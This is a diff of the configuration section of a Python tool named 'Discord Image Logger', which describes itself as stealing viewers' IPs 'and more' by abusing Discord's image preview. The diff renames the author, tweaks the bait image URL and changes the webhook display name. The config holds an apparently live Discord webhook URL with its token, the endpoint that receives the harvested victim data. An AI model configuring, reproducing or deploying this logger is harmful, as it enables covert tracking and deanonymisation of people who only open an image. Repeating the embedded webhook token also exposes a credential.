@@ -8,17 +8,17 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "rehab"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1429253645269991598/dW5ATLMqcmNRLYsBlx9LNdC2dlT0pBXMB7IwTYHFyQEDt0L2wB73BZZDYZHw5uea7gAk",
-    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png?w=1024", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "rotted": "gtu ah", # Set this to the name you want the webhook to have
+    "rotted": "gtu.ah", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
